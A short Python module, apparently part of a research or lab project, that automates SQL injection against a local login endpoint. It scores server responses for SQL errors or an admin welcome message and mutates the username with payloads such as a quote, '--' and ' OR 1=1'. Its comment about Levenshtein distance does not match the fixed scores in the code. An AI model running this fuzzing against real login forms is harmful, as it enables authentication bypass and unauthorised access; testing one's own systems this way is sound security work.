import requests
from bs4 import BeautifulSoup
from State import State

# calculates the heuristic cost based on the response of GET /login and its levenshtein distance from the goal_text
def heuristic_cost(username, password):
    url = "http://localhost:5000/login"
    goal_text = "Welcome, admin!"
    payload = {'username': username, 'password': password}

    try:
        response = requests.post(url, json=payload)
        soup = BeautifulSoup(response.text, 'html.parser')
        page_text = soup.get_text()

        if "SQL syntax error" in page_text or "Internal Server Error" in page_text:
            return 10

    except requests.exceptions.RequestException as e:
        print(f"Received request exception: {e}")
        page_text = e

    if goal_text in page_text:
        return 0

    return 20

def fake_heuristic(username, password):
    """
    Fake heuristic that just determines if a goal state was reached.
    """
    url = "http://localhost:5000/login"
    goal_text = "Welcome, admin!"
    payload = {'username': username, 'password': password}

    try:
        response = requests.post(url, json=payload)
        soup = BeautifulSoup(response.text, 'html.parser')
        page_text = soup.get_text()

    except requests.exceptions.RequestException as e:
        print(f"Received request exception: {e}")
        page_text = e

    if goal_text in page_text:
        return 0

    return 1

# generates mutations to get closer to an SQL injection
def generate_mutations(state: State) -> list[tuple[str, str]]:
    username = state.username
    password = state.password

    # Respectively, mutations are:
    # append a quote
    # append a sql comment
    # append sql
    mutations = ["'", "--", " OR 1=1"]
    generated_mutations = [(username + mutation, password) for mutation in mutations]

    return generated_mutations